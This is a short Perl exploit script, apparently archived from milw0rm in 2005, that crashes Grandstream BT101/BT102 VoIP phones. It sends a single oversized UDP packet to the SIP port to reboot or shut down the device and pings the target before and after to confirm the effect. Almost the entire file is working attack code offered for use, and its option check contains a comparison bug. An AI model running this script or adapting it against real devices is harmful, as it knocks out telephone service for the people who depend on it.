#!/usr/bin/perl
#
use IO::Socket;
use Term::ANSIColor;

############################ U S A G E ###################################
system ("clear");
print "\nGrandstream BT101/BT102 DoS\n";
print "written by pierre kroma (kroma\@syss.de)\n\n";

if (!$ARGV[2]){
print qq~
Usage: perl grandstream-DoS.pl -s <ip-addr> <udp-port> {-r/-s}

	<ip-addr>  = ;-)
	<udp-port> = 5060

	-r = 'reboot' 	the Grandstream BT 101/102
	-s = 'shutdown' the Grandstream BT 101/102

~; exit;}
################################## D E F I N I T I O N S####################

$victim = $ARGV[0];
$port = $ARGV[1];
$option = $ARGV[2];

if ( $option == 'r' || $option == 'R' )
{	$request= 'k'x65534;}

if ( $option == 's' || $option == 'S' )
{	$request= 'p'x65535;}
else
{	print "Wrong parameter - try it again";
	exit;
}


# ping the remote device
print color 'bold blue';
print "\nping the remote device $victim\n";
print color 'reset';
system("ping -c 3 $victim");

print color 'bold red';
print "\n Wait ... \n\n\n";
print color 'reset';
$sox = IO::Socket::INET->new(Proto=>"udp",PeerPort=>"$port",PeerAddr=>"$victim");

print $sox $request;
sleep 1;
close $sox;

# ping the remote device
print color 'bold blue';
print "ping the remote device $victim again\n";
print color 'reset';
system("ping -c 3 $victim");

# milw0rm.com [2005-08-12]